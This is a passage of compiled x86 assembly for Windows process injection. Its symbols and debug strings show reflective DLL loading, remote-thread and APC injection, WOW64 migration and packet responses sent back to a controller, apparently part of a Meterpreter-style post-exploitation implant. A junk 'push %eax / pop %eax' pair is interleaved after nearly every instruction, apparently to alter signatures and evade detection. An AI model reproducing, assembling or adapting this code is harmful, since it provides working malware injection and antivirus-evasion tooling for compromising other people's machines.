push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L26
push %eax
pop %eax
L40:
	nop
push %eax
pop %eax
	jmp	L26
push %eax
pop %eax
L41:
	nop
push %eax
pop %eax
L26:
	leal	-88(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Thread32Next@8
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L24
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L39:
	nop
push %eax
pop %eax
L6:
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	jne	L30
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L30
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L30
push %eax
pop %eax
	movl	$2, 8(%esp)
push %eax
pop %eax
	movl	$131478, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_add_tlv_uint
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	call	_packet_transmit_response
push %eax
pop %eax
	movl	$2000, (%esp)
push %eax
pop %eax
	movl	__imp__Sleep@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L30:
	cmpl	$0, -44(%ebp)
push %eax
pop %eax
	je	L31
push %eax
pop %eax
L34:
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_list_pop
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	cmpl	$0, -60(%ebp)
push %eax
pop %eax
	je	L42
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__ResumeThread@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	jmp	L34
push %eax
pop %eax
L42:
	nop
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_list_destroy
push %eax
pop %eax
L31:
	cmpl	$0, -20(%ebp)
push %eax
pop %eax
	je	L35
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L35:
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	je	L36
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__FreeLibrary@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L36:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC23:
	.ascii "[INJECT] inject_via_remotethread_wow64: GetVersionEx failed\0"
	.align 4
LC24:
	.ascii "[INJECT] inject_via_remotethread_wow64: Windows 2003 not supported.\0"
	.align 4
LC25:
	.ascii "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pExecuteX64 failed\0"
	.align 4
LC26:
	.ascii "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pX64function failed\0"
	.align 4
LC27:
	.ascii "[INJECT] inject_via_remotethread_wow64: pExecuteX64=0x%08X, pX64function=0x%08X, ctx=0x%08X\0"
	.align 4
LC28:
	.ascii "[INJECT] inject_via_remotethread_wow64: pExecuteX64( pX64function, ctx ) failed\0"
	.align 4
LC29:
	.ascii "[INJECT] inject_via_remotethread_wow64: ctx->t.hThread is NULL\0"
	.align 4
LC30:
	.ascii "[INJECT] inject_via_remotethread_wow64: Success, hThread=0x%08X\0"
	.text
	.globl	_inject_via_remotethread_wow64
	.def	_inject_via_remotethread_wow64;	.scl	2;	.type	32;	.endef
_inject_via_remotethread_wow64:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%edi
push %eax
pop %eax
	pushl	%esi
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$204, %esp
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	movl	$0, -36(%ebp)
push %eax
pop %eax
	movl	$0, -40(%ebp)
push %eax
pop %eax
	leal	-188(%ebp), %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	movl	$37, %ecx
push %eax
pop %eax
	movl	%edx, %edi
push %eax
pop %eax
	rep stosl
push %eax
pop %eax
	movl	$148, -188(%ebp)
push %eax
pop %eax
	leal	-188(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetVersionExA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L44
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC23, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L45
push %eax
pop %eax
L44:
	movl	-184(%ebp), %eax
push %eax
pop %eax
	cmpl	$5, %eax
push %eax
pop %eax
	jne	L46
push %eax
pop %eax
	movl	-180(%ebp), %eax
push %eax
pop %eax
	cmpl	$2, %eax
push %eax
pop %eax
	jne	L46
push %eax
pop %eax
	movl	$5, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC24, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L45
push %eax
pop %eax
L46:
	movl	$64, 12(%esp)
push %eax
pop %eax
	movl	$12288, 8(%esp)
push %eax
pop %eax
	movl	$82, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAlloc@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	jne	L47
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC25, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L45
push %eax
pop %eax
L47:
	movl	$64, 12(%esp)
push %eax
pop %eax
	movl	$12288, 8(%esp)
push %eax
pop %eax
	movl	$329, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAlloc@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	cmpl	$0, -36(%ebp)
push %eax
pop %eax
	jne	L48
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC26, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L45
push %eax
pop %eax
L48:
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	$_migrate_executex64, %ebx
push %eax
pop %eax
	movl	$82, %edx
push %eax
pop %eax
	movl	(%ebx), %ecx
push %eax
pop %eax
	movl	%ecx, (%eax)
push %eax
pop %eax
	movl	-4(%ebx,%edx), %ecx
push %eax
pop %eax
	movl	%ecx, -4(%eax,%edx)
push %eax
pop %eax
	leal	4(%eax), %edi
push %eax
pop %eax
	andl	$-4, %edi
push %eax
pop %eax
	subl	%edi, %eax
push %eax
pop %eax
	subl	%eax, %ebx
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	andl	$-4, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	shrl	$2, %eax
push %eax
pop %eax
	movl	%ebx, %esi
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	rep movsl
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	$_migrate_wownativex, %ebx
push %eax
pop %eax
	movl	$297, %edx
push %eax
pop %eax
	movl	(%ebx), %ecx
push %eax
pop %eax
	movl	%ecx, (%eax)
push %eax
pop %eax
	movl	-4(%ebx,%edx), %ecx
push %eax
pop %eax
	movl	%ecx, -4(%eax,%edx)
push %eax
pop %eax
	leal	4(%eax), %edi
push %eax
pop %eax
	andl	$-4, %edi
push %eax
pop %eax
	subl	%edi, %eax
push %eax
pop %eax
	subl	%eax, %ebx
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	andl	$-4, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	shrl	$2, %eax
push %eax
pop %eax
	movl	%ebx, %esi
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	rep movsl
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$297, %eax
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%eax)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 16(%eax)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	$0, 24(%eax)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC27, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L49
push %eax
pop %eax
	movl	$5, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC28, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L45
push %eax
pop %eax
L49:
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L50
push %eax
pop %eax
	movl	$6, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC29, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L45
push %eax
pop %eax
L50:
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %edx
push %eax
pop %eax
	movl	20(%ebp), %eax
push %eax
pop %eax
	movl	%edx, (%eax)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC30, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L45:
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	je	L51
push %eax
pop %eax
	movl	$16384, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualFree@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
L51:
	cmpl	$0, -36(%ebp)
push %eax
pop %eax
	je	L52
push %eax
pop %eax
	movl	$16384, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualFree@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
L52:
	movl	-28(%ebp), %eax
push %eax
pop %eax
	leal	-12(%ebp), %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%esi
push %eax
pop %eax
	popl	%edi
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC31:
	.ascii "[INJECT] inject_via_remotethread: migrate_via_remotethread_wow64 failed\0"
	.align 4
LC32:
	.ascii "[INJECT] inject_via_remotethread: CreateRemoteThread failed\0"
	.align 4
LC33:
	.ascii "[INJECT] inject_via_remotethread: succeeded\0"
	.align 4
LC34:
	.ascii "[INJECT] inject_via_remotethread: Sending a migrate response...\0"
	.align 4
LC35:
	.ascii "[INJECT] inject_via_remotethread: Sleeping for two seconds...\0"
	.align 4
LC36:
	.ascii "[INJECT] inject_via_remotethread: Resuming the injected thread...\0"
	.align 4
LC37:
	.ascii "[INJECT] inject_via_remotethread: ResumeThread failed\0"
	.text
	.globl	_inject_via_remotethread
	.def	_inject_via_remotethread;	.scl	2;	.type	32;	.endef
_inject_via_remotethread:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	$0, 20(%esp)
push %eax
pop %eax
	movl	$4, 16(%esp)
push %eax
pop %eax
	movl	28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$1048576, 4(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_create_remote_thread
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L55
push %eax
pop %eax
	cmpl	$2, 20(%ebp)
push %eax
pop %eax
	jne	L56
push %eax
pop %eax
	movl	$1, -16(%ebp)
push %eax
pop %eax
	leal	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_inject_via_remotethread_wow64
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L57
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC31, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L58
push %eax
pop %eax
L56:
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC32, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L58
push %eax
pop %eax
L55:
	movl	$LC33, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L57:
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L59
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L59
push %eax
pop %eax
	movl	$LC34, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$131478, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_add_tlv_uint
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	call	_packet_transmit_response
push %eax
pop %eax
	movl	$LC35, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$2000, (%esp)
push %eax
pop %eax
	movl	__imp__Sleep@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L59:
	movl	$LC36, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__ResumeThread@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	jne	L58
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC37, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	nop
push %eax
pop %eax
L58:
	movl	-20(%ebp), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L60
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
L60:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC38:
	.ascii "[INJECT] inject_dll.  No Dll buffer supplied.\0"
	.align 4
LC39:
	.ascii "[INJECT] inject_dll. GetReflectiveLoaderOffset failed.\0"
	.align 4
LC40:
	.ascii "[INJECT] inject_dll. OpenProcess failed.\0"
	.align 4
LC41:
	.ascii "[INJECT] inject_dll. VirtualAllocEx 1 failed\0"
	.align 4
LC42:
	.ascii "[INJECT] inject_dll. WriteProcessMemory 1 failed\0"
	.align 4
LC43:
	.ascii "[INJECT] inject_dll. VirtualAllocEx 2 failed\0"
	.align 4
LC44:
	.ascii "[INJECT] inject_dll. WriteProcessMemory 2 failed\0"
	.align 4
LC45:
	.ascii "[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread...\0"
	.align 4
LC46:
	.ascii "[INJECT] inject_dll. inject_via_apcthread failed\0"
	.text
	.globl	_inject_dll
	.def	_inject_dll;	.scl	2;	.type	32;	.endef
_inject_dll:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$72, %esp
push %eax
pop %eax
	movl	$5, -12(%ebp)
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	movl	$0, -36(%ebp)
push %eax
pop %eax
	cmpl	$0, 12(%ebp)
push %eax
pop %eax
	je	L63
push %eax
pop %eax
	cmpl	$0, 16(%ebp)
push %eax
pop %eax
	jne	L64
push %eax
pop %eax
L63:
	movl	$87, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC38, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L65
push %eax
pop %eax
L64:
	movl	20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_GetReflectiveLoaderOffset
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	cmpl	$0, -36(%ebp)
push %eax
pop %eax
	jne	L66
push %eax
pop %eax
	movl	$1, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC39, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L65
push %eax
pop %eax
L66:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	$1146, (%esp)
push %eax
pop %eax
	movl	__imp__OpenProcess@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	cmpl	$0, -20(%ebp)
push %eax
pop %eax
	jne	L67
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC40, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L65
push %eax
pop %eax
L67:
	cmpl	$0, 24(%ebp)
push %eax
pop %eax
	je	L68
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strlen
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movl	$4, 16(%esp)
push %eax
pop %eax
	movl	$12288, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAllocEx@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jne	L69
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC41, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L65
push %eax
pop %eax
L69:
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strlen
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L68
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
